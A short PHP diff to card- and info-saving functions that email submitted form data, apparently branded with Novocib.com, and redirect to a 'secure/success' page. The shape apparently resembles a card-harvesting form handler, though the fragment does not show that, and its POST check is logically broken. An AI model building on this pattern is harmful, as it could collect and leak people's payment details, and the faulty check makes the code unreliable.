@@ -31,7 +31,6 @@ function save_card(?string $key): ?string
 }
 
 
-
 function save_info()
 {
     if (isset($_POST['pid']) || empty($_POST['pid'])) header("Location: /");
@@ -60,7 +59,5 @@ function save_info()
     Message  generated automatically by Novocib.com
     ";
     $sent = Mail::send($email, $subject, $message);
-    // echo $sent ? "Store and Send Successfully" : "FAILED";
-    echo $key;
-    die;
+    if ($sent) header("Location: secure/success");
 }
